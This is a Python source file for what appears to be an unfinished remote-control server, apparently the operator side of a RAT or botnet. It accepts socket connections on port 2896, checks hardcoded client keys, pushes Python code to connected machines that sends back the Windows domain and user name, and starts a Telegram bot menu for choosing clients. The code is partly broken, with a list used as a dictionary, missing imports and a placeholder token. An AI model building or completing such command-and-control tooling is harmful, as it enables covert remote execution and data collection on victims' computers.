import os
import base64
import socket
import telebot
import hashlib
import keyboard
import threading

AuthorizatedClients = []
Terminal = []

def Endpoint():
    global AuthorizatedClients, Terminal

    ClientKey = b"CK_H29DJLA23NV92MCBB09AQJ2IFV8"
    EndpointKey = b"EP_AL3290OSL2390G02MSXK30GL4DA"

    Socket = socket.socket()
    Socket.bind(("0.0.0.0", 2896))
    Socket.listen(99999)

    def ClientHandle(Client, Address):
        print(str(Address), ": Authorization...")

        if Client.recv(1024) == base64.b64encode(ClientKey):
            Client.send(base64.b64encode(EndpointKey))

            Client.send(b"""import os
Data = os.getenv("userdomain") + "/" + os.getenv("username")
Socket.send(Data.encode())""")

            Data = Client.recv(1024)

            AuthorizatedClients[Data.decode()] = Client
            print(Data.decode(), ": Authorized.")

            print(AuthorizatedClients)

            exit()
        else:
            print(str(Address), ": Unauthorized.")
            try:
                Client.close()
            except:
                pass
            exit()

    print("System: Waiting for connections")
    while True:
        Client, Address = Socket.accept()

        threading.Thread(target=ClientHandle, args=(Client, Address,)).start()


threading.Thread(target=Endpoint).start()

ChatId = "Nonnonono litle bro"
Bot = telebot.TeleBot("?")

@Bot.message_handler()
def Handle(Message):
    if Message.chat.id != ChatId:
        return
    
    if Message.text.lower() == "/start":
        Markup = InlineKeyboardMarkup()
        for Client in AuthorizatedClients:
            Markup.add(InlineKeyboardButton("Кнопка 1", callback_data="but_1"))
        
        Bot.send_message(ChatId, "1")
